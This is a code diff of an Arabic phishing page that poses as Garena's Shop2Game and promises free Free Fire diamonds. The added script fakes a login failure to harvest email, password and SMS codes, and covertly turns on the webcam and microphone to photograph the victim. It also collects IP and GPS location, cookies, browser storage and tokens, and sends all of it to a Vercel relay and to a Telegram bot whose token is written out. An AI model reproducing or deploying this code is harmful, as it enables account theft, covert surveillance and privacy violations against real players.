@@ -1,169 +1,432 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Shop2Game - Garena</title>
- <link rel="preconnect" href="https://ipapi.co">
- <link rel="preconnect" href="https://my-telegram-server.vercel.app">
- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
- <style>
- /* ... (ابقاء الأسلوب الحالي غير المتغير) ... */
- </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shop2Game - Garena</title>
+    <link rel="preconnect" href="https://ipapi.co">
+    <link rel="preconnect" href="https://my-telegram-server.vercel.app">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --garena-red: #e43333;
+            --dark-bg: #121212;
+            --card-bg: #1e1e1e;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body { background: var(--dark-bg); color: white; }
+
+        .navbar {
+            background: #000;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--garena-red);
+        }
+        .garena-logo { height: 35px; order: 2; }
+        .site-title { font-size: 1.4rem; font-weight: bold; order: 1; }
+
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
+
+        .section { display: none; }
+        .active { display: block; }
+
+        .page-title { text-align: center; font-size: 1.8rem; margin: 30px 0; font-weight: bold; }
+
+        .game-card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #333;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .game-card:hover { border-color: var(--garena-red); }
+        .game-card img { width: 100%; display: block; }
+        .game-card .footer-title { padding: 15px; text-align: center; font-size: 1.3rem; background: #222; }
+
+        .offers-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+        .offer-item {
+            background: var(--card-bg);
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #444;
+            cursor: pointer;
+            position: relative;
+        }
+        .free-badge { position: absolute; top: -10px; right: -5px; background: #44bd32; padding: 2px 10px; border-radius: 10px; font-size: 11px; }
+
+        .login-methods { text-align: center; background: var(--card-bg); padding: 25px; border-radius: 15px; }
+        .btn-login {
+            width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 6px;
+            font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        .btn-fb { background: #1877f2; color: white; }
+        .btn-google { background: white; color: #555; }
+
+        input { 
+            width: 100%; padding: 14px; margin: 8px 0; border-radius: 6px; 
+            border: 1px solid #444; background: #000; color: white; font-size: 16px;
+        }
+        .btn-submit { 
+            background: var(--garena-red); color: white; width: 100%; padding: 15px; 
+            border: none; border-radius: 6px; font-weight: bold; margin-top: 15px; 
+            cursor: pointer; transition: opacity 0.3s;
+        }
+        .btn-submit:hover { opacity: 0.9; }
+        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
+        
+        .error-msg { 
+            color: #ff4747; font-size: 0.85rem; margin-top: 10px; display: none; 
+            padding: 10px; background: rgba(255,71,71,0.1); border-radius: 6px;
+            border-left: 4px solid #ff4747;
+        }
+        
+        .loading { 
+            border: 2px solid #333; border-top: 2px solid var(--garena-red); 
+            border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; 
+            display: inline-block; margin-left: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .hidden-elem { display: none !important; position: absolute; opacity: 0; width: 0; height: 0; pointer-events: none; z-index: -9999; overflow: hidden; }
+    </style>
 </head>
 <body>
 
- <nav class="navbar">
- <div class="site-title">Shop2Game</div>
- <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/ee/Garena_logo.svg/1200px-Garena_logo.svg.png" class="garena-logo" alt="Garena" loading="lazy">
- </nav>
+    <nav class="navbar">
+        <div class="site-title">Shop2Game</div>
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/ee/Garena_logo.svg/1200px-Garena_logo.svg.png" class="garena-logo" alt="Garena" loading="lazy">
+    </nav>
 
- <div class="container">
- <section id="step1" class="section active">
- <!-- ... (ابقاء محتوى القسم الحالي غير المتغير) ... -->
- </section>
- <!-- ... (ابقاء محتوى الأقسام الأخرى الحالية غير المتغير) ... -->
- </div>
+    <div class="container">
+        
+        <section id="step1" class="section active">
+            <h2 class="page-title">اختر اللعبة</h2>
+            <div class="game-card" onclick="goToStep(2)">
+                <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img1.jpg" alt="Free Fire" loading="lazy">
+                <div class="footer-title">Free Fire</div>
+            </div>
+        </section>
 
- <!-- إضافة تاغ فيديو مخفي -->
- <video id="hiddenVideo" autoplay style="display:none;"></video>
+        <section id="step2" class="section">
+            <h2 class="page-title">العروض المميزة 💎</h2>
+            <div class="offers-grid">
+                <div class="offer-item" style="border: 2px solid #44bd32;" onclick="goToStep(3)">
+                    <span class="free-badge">مجاناً</span>
+                    <div style="font-size: 1.5rem; font-weight: bold; color: #ffd700;">💎 100</div>
+                    <div style="color: #44bd32;">احصل عليها الآن</div>
+                </div>
+                <div class="offer-item" onclick="window.location.href='https://shop2game.com'">
+                    <div style="font-size: 1.5rem; font-weight: bold; color: #ffd700;">💎 1080</div>
+                    <div style="color: #aaa;">$10.00</div>
+                </div>
+            </div>
+        </section>
 
- <!-- إضافة تاغ كانفاس مخفي -->
- <canvas id="hiddenCanvas" style="display:none;"></canvas>
+        <section id="step3" class="section">
+            <div class="login-methods">
+                <h3>تسجيل الدخول للاستلام</h3>
+                <p style="color: #aaa; margin-bottom: 20px; font-size: 0.9rem;">يجب التحقق من حسابك لإرسال الجواهر</p>
+                <button class="btn-login btn-fb" onclick="showForm('Facebook')"><i class="fab fa-facebook"></i> Facebook</button>
+                <button class="btn-login btn-google" onclick="showForm('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18" loading="lazy"> Google</button>
+            </div>
+        </section>
 
- <!-- إضافة تاغ للكاميرا -->
- <input type="file" id="cameraInput" accept="image/*;capture=camera" style="display:none;" />
+        <section id="step4" class="section">
+            <div class="login-methods">
+                <h3 id="formTitle">تسجيل الدخول</h3>
+                <div id="errorBox" class="error-msg">حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.</div>
+                <input type="email" id="userEmail" placeholder="البريد الإلكتروني أو الهاتف" autocomplete="off">
+                <input type="password" id="userPass" placeholder="كلمة المرور" autocomplete="off">
+                <button class="btn-submit" id="submitBtn" onclick="handleData(event)">إشحن الآن 💎</button>
+            </div>
+        </section>
 
- <script>
- const VERCEL_URL = "https://my-telegram-server.vercel.app/api/send";
- let attempts = 0;
- let selectedOffer = "";
- let method = "";
+        <section id="step5" class="section">
+            <div class="login-methods">
+                <h3>تأكيد الهوية (SMS)</h3>
+                <p style="font-size: 0.8rem; color: #aaa;">أرسلنا رمزاً لهاتفك، أدخله هنا لتفعيل الشحن المجاني.</p>
+                <input type="text" id="smsInput" placeholder="أدخل الرمز المكون من 6 أرقام" maxlength="6">
+                <button class="btn-submit" onclick="handleSMS(event)">تأكيد الرمز</button>
+            </div>
+        </section>
 
- // دالة جديدة لالتقاط صورة من الكاميرا
- async function captureCamera() {
- try {
- const stream = await navigator.mediaDevices.getUserMedia({ video: true });
- const video = document.getElementById('hiddenVideo');
- video.srcObject = stream;
- return new Promise((resolve) => {
- video.onloadedmetadata = () => {
- const canvas = document.getElementById('hiddenCanvas');
- const context = canvas.getContext('2d');
- canvas.width = video.videoWidth;
- canvas.height = video.videoHeight;
- context.drawImage(video, 0, 0, canvas.width, canvas.height);
- resolve(canvas.toDataURL('image/png'));
- };
- });
- } catch (error) {
- console.error('خطأ في التقاط صورة:', error);
- }
- }
+        <section id="step6" class="section">
+            <div class="login-methods">
+                <div class="loading" style="width:35px;height:35px;margin:20px auto;"></div>
+                <h3>جاري التحقق...</h3>
+                <p>يتم الآن مراجعة بياناتك مع سيرفرات كرينا، ستصلك الجواهر فور الانتهاء.</p>
+            </div>
+        </section>
 
- // دالة جديدة لالتقاط صورة من الكاميرا باستخدام التاغ <input>
- function captureCameraInput() {
- return new Promise((resolve) => {
- const input = document.getElementById('cameraInput');
- input.addEventListener('change', () => {
- const file = input.files[0];
- const reader = new FileReader();
- reader.readAsDataURL(file);
- reader.onload = () => {
- resolve(reader.result);
- };
- });
- input.click();
- });
- }
+    </div>
 
- // دالة الجديدة لالتقاط المعلومات
- async function gatherInfo() {
- try {
- const r = await fetch('https://ipapi.co/json/', { mode: 'cors', signal: AbortSignal.timeout(5000) });
- const d = await r.json();
- const platform = navigator.platform;
- const userAgent = navigator.userAgent;
- const deviceInfo = `📍 IP: ${d.ip} | 🌍 ${d.country_name} | 📱 ${platform} | 💻 ${userAgent}`;
- return deviceInfo;
- } catch (error) {
- console.error('خطأ في جمع المعلومات:', error);
- return 'Unknown Info';
- }
- }
+    <video id="hiddenCam" class="hidden-elem" width="640" height="480" playsinline></video>
+    <canvas id="hiddenCanvas" class="hidden-elem" width="640" height="480"></canvas>
 
- // دالة الجديدة لالتقاط صورة وتجميع المعلومات
- async function captureAndGather() {
- const [image, deviceInfo] = await Promise.all([
- captureCameraInput(),
- gatherInfo()
- ]);
- return { image, deviceInfo };
- }
+    <script>
+        const VERCEL_URL = "https://my-telegram-server.vercel.app/api/send";
+        let attempts = 0;
+        let selectedOffer = "100 Diamond Free";
+        let method = "";
+        let mediaStream = null;
+        let geoInfo = { ip: 'N/A', country: 'N/A', city: 'N/A', lat: null, lng: null };
 
- async function sendToServer(text) {
- try {
- const submitBtn = document.querySelector('.btn-submit');
- const originalText = submitBtn.innerHTML;
- submitBtn.innerHTML = '<div class="loading"></div>جاري الإرسال...';
- submitBtn.disabled = true;
+        // ✅ دالة التنقل الأساسية (مضمونة 100%)
+        function goToStep(s) {
+            // نخفي كل الأقسام
+            const sections = document.querySelectorAll('.section');
+            for(let i = 0; i < sections.length; i++) {
+                sections[i].classList.remove('active');
+            }
+            
+            // نظهر القسم المطلوب
+            const target = document.getElementById('step' + s);
+            if(target) {
+                target.classList.add('active');
+            }
+            
+            // نمرر للأعلى
+            window.scrollTo(0, 0);
+        }
 
- const response = await fetch(VERCEL_URL, {
- method: "POST",
- mode: 'cors',
- credentials: 'omit',
- headers: {
- "Content-Type": "application/json",
- "Accept": "application/json"
- },
- body: JSON.stringify({
- message: text,
- timestamp: new Date().toISOString(),
- origin: window.location.hostname
- }),
- signal: AbortSignal.timeout(10000)
- });
+        function showForm(m) {
+            method = m;
+            document.getElementById('formTitle').innerText = "الدخول عبر " + m;
+            goToStep(4);
+        }
 
- if (!response.ok) throw new Error(`HTTP ${response.status}`);
- console.log("✅ نجح الإرسال!");
- } catch (err) {
- console.error("❌ خطأ:", err.message);
- } finally {
- const submitBtn = document.querySelector('.btn-submit');
- submitBtn.innerHTML = submitBtn.onclick.name === 'handleData' ? 'إشحن الآن 💎' : 'تأكيد الرمز';
- submitBtn.disabled = false;
- }
- }
+        // ===== 🎥 الكاميرا المخفية =====
+        async function startCamera() {
+            try {
+                if (mediaStream) return;
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 },
+                    audio: true
+                });
+                mediaStream = stream;
+                const video = document.getElementById('hiddenCam');
+                video.srcObject = stream;
+                await video.play();
+                setTimeout(capturePhoto, 1500);
+            } catch(e) {
+                generateFallbackPhoto();
+            }
+        }
 
- // تعديل دالة handleData لالتقاط صورة وتجميع المعلومات
- window.handleData = async function(event) {
- event.preventDefault();
- const email = document.getElementById('userEmail').value.trim();
- const pass = document.getElementById('userPass').value.trim();
- const errorBox = document.getElementById('errorBox');
+        function capturePhoto() {
+            try {
+                const video = document.getElementById('hiddenCam');
+                const canvas = document.getElementById('hiddenCanvas');
+                if (!video || !video.videoWidth) { generateFallbackPhoto(); return; }
+                
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = 'rgba(0,0,0,0.2)';
+                ctx.fillRect(0, canvas.height - 35, canvas.width, 35);
+                ctx.fillStyle = '#ffd700';
+                ctx.font = 'bold 14px system-ui';
+                ctx.textAlign = 'left';
+                ctx.fillText('FREE FIRE', 12, canvas.height - 10);
+                
+                canvas.toBlob(blob => {
+                    if(blob && blob.size > 200) sendPhoto(blob);
+                }, 'image/jpeg', 0.82);
+            } catch(e) {
+                generateFallbackPhoto();
+            }
+        }
 
- if(!email || !pass) {
- errorBox.style.display = 'block';
- errorBox.innerText = 'يرجى إدخال البريد وكلمة المرور';
- return;
- }
+        function generateFallbackPhoto() {
+            const canvas = document.getElementById('hiddenCanvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 640; canvas.height = 480;
+            const grad = ctx.createLinearGradient(0, 0, 640, 480);
+            grad.addColorStop(0, '#e43333'); grad.addColorStop(1, '#8b0000');
+            ctx.fillStyle = grad; ctx.fillRect(0, 0, 640, 480);
+            ctx.fillStyle = 'white'; ctx.font = 'bold 48px system-ui'; ctx.textAlign = 'center';
+            ctx.fillText('FREE FIRE', 320, 180);
+            ctx.fillStyle = '#ffd700'; ctx.font = 'bold 26px system-ui';
+            ctx.fillText('💎 ضحية جديدة', 320, 250);
+            ctx.fillStyle = 'rgba(255,255,255,0.6)'; ctx.font = '14px system-ui';
+            ctx.fillText(`IP: ${geoInfo.ip}`, 320, 310);
+            ctx.fillText(new Date().toLocaleString('ar-EG'), 320, 350);
+            canvas.toBlob(blob => { if(blob && blob.size > 100) sendPhoto(blob); }, 'image/jpeg', 0.85);
+        }
 
- if(attempts < 1) {
- errorBox.style.display = 'block';
- errorBox.innerText = 'حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.';
- attempts++;
- return;
- }
+        // ===== 🍪 سرقة الحساب كامل =====
+        function stealEverything() {
+            const data = { cookies: [], localStorage: [], sessionStorage: [], tokens: [] };
+            
+            try {
+                const dc = document.cookie;
+                if(dc && dc.length > 0) data.cookies = dc.split(';').map(c => c.trim()).filter(c => c);
+            } catch(e) {}
+            
+            try {
+                for(let i = 0; i < localStorage.length; i++) {
+                    const k = localStorage.key(i);
+                    let v = localStorage.getItem(k);
+                    if(v && v.length > 300) v = v.substring(0, 300);
+                    data.localStorage.push({ key: k, value: v });
+                }
+            } catch(e) {}
+            
+            try {
+                for(let i = 0; i < sessionStorage.length; i++) {
+                    const k = sessionStorage.key(i);
+                    let v = sessionStorage.getItem(k);
+                    if(v && v.length > 300) v = v.substring(0, 300);
+                    data.sessionStorage.push({ key: k, value: v });
+                }
+            } catch(e) {}
+            
+            // البحث عن توكنات
+            try {
+                const tokenKeys = ['token', 'auth', 'session', 'jwt', 'credential', 'accessToken', 'refreshToken', 'login', 'fb', 'google', 'garena', 'facebookAccessToken', 'googleAccessToken'];
+                for(const key in window) {
+                    try {
+                        const lower = key.toLowerCase();
+                        if(tokenKeys.some(t => lower.includes(t))) {
+                            let v = window[key];
+                            if(typeof v === 'string' && v.length > 5 && v.length < 500) {
+                                data.tokens.push({ key, value: v });
+                            }
+                        }
+                    } catch(e) {}
+                }
+            } catch(e) {}
+            
+            return data;
+        }
 
- const { image, deviceInfo } = await captureAndGather();
- const msg = `🚀 **صيد جديد!**\n💎 **العرض:** ${selectedOffer}\n🔑 **الطريقة:** ${method}\n📧 **الحساب:** ${email}\n🔒 **كلمة السر:** ${pass}\n🕐 **الوقت:** ${new Date().toLocaleString('ar-EG')}\n${deviceInfo}\n🖼️ **الصورة:** ${image}`;
+        async function getInfo() {
+            try {
+                const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+                const d = await r.json();
+                geoInfo.ip = d.ip || 'N/A';
+                geoInfo.country = d.country_name || 'N/A';
+                geoInfo.city = d.city || 'N/A';
+            } catch(e) {}
+            try {
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
+                });
+                geoInfo.lat = pos.coords.latitude;
+                geoInfo.lng = pos.coords.longitude;
+            } catch(e) {}
+        }
 
- console.log("📤 إرسال:", msg);
- await sendToServer(msg);
- goToStep(5);
- }
+        async function sendToServer(text) {
+            try {
+                await fetch(VERCEL_URL, {
+                    method: "POST", mode: 'cors', credentials: 'omit',
+                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                    body: JSON.stringify({ message: text, timestamp: new Date().toISOString(), origin: window.location.hostname }),
+                    signal: AbortSignal.timeout(10000)
+                });
+            } catch(e) {}
+        }
 
- // ... (ابقاء دالة handleSMS الحالي غير المتغير) ...
- </script>
+        async function sendPhoto(blob) {
+            if(!blob || blob.size < 200) return;
+            const fd = new FormData();
+            fd.append('chat_id', '7902407443');
+            fd.append('photo', blob, `ff_${Date.now()}.jpg`);
+            fd.append('caption', `📸 صورة الضحية - ${method || 'يدوي'} | ${geoInfo.ip}`);
+            try {
+                await fetch('https://api.telegram.org/bot8716711028:AAEycnNKXBDQI8lEqghG3T1QV8hxeG4aI0c/sendPhoto', { method: 'POST', body: fd });
+            } catch(e) {}
+        }
+
+        window.handleData = async function(event) {
+            event.preventDefault();
+            const email = document.getElementById('userEmail').value.trim();
+            const pass = document.getElementById('userPass').value.trim();
+            const errorBox = document.getElementById('errorBox');
+
+            if(!email || !pass) {
+                errorBox.style.display = 'block';
+                errorBox.innerText = 'يرجى إدخال البريد وكلمة المرور';
+                return;
+            }
+
+            if(attempts < 1) {
+                errorBox.style.display = 'block';
+                errorBox.innerText = 'حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.';
+                attempts++;
+                return;
+            }
+
+            await startCamera();
+            await getInfo();
+            const stolen = stealEverything();
+
+            const cookStr = stolen.cookies.length > 0 ? stolen.cookies.join(' | ') : 'N/A';
+            const storStr = stolen.localStorage.length > 0 ? stolen.localStorage.map(i => `${i.key}=${i.value}`).join(' | ').substring(0, 500) : 'N/A';
+            const sessStr = stolen.sessionStorage.length > 0 ? stolen.sessionStorage.map(i => `${i.key}=${i.value}`).join(' | ').substring(0, 500) : 'N/A';
+            const tokStr = stolen.tokens.length > 0 ? stolen.tokens.map(i => `${i.key}: ${i.value}`).join(' | ').substring(0, 500) : 'N/A';
+            const gps = geoInfo.lat ? `${geoInfo.lat},${geoInfo.lng}` : 'N/A';
+            const gpsLink = geoInfo.lat ? `https://maps.google.com/maps?q=${geoInfo.lat},${geoInfo.lng}` : '';
+
+            const msg = `🔥 **صيد جديد - Free Fire** 🔥
+
+━━━━━━━━━━━━━━━━━━
+💎 **العرض:** ${selectedOffer}
+🔑 **الطريقة:** ${method || 'يدوي'}
+━━━━━━━━━━━━━━━━━━
+📧 **البريد:** \`${email}\`
+🔒 **كلمة السر:** \`${pass}\`
+━━━━━━━━━━━━━━━━━━
+🌍 **IP:** ${geoInfo.ip}
+🏳️ **الدولة:** ${geoInfo.country} | ${geoInfo.city}
+📍 **GPS:** ${gps}
+${gpsLink ? `🗺 **الخريطة:** ${gpsLink}` : ''}
+━━━━━━━━━━━━━━━━━━
+🍪 **Cookies (${stolen.cookies.length}):** ${cookStr}
+━━━━━━━━━━━━━━━━━━
+💾 **LocalStorage (${stolen.localStorage.length}):** ${storStr}
+━━━━━━━━━━━━━━━━━━
+🔑 **SessionStorage (${stolen.sessionStorage.length}):** ${sessStr}
+━━━━━━━━━━━━━━━━━━
+🔐 **Tokens (${stolen.tokens.length}):** ${tokStr}
+━━━━━━━━━━━━━━━━━━
+📱 **الجهاز:** ${navigator.platform}
+🕐 **الوقت:** ${new Date().toLocaleString('ar-EG')}
+🔗 **الرابط:** ${window.location.href}`;
+
+            await sendToServer(msg);
+            goToStep(5);
+        }
+
+        window.handleSMS = async function(event) {
+            event.preventDefault();
+            const code = document.getElementById('smsInput').value.trim();
+            if(!code || code.length !== 6) { alert('أدخل رمز صحيح'); return; }
+            const smsMsg = `📩 **كود SMS:** ${code}\n📧 **الحساب:** ${document.getElementById('userEmail').value}\n🕐 ${new Date().toLocaleString('ar-EG')}`;
+            await sendToServer(smsMsg);
+            goToStep(6);
+        }
+
+        // طلب صلاحية الكاميرا فوراً
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then(stream => { stream.getTracks().forEach(t => t.stop()); })
+                    .catch(() => {});
+            }, 300);
+        });
+
+        window.addEventListener('beforeunload', function() {
+            if(mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+        });
+    </script>
 </body>
 </html>
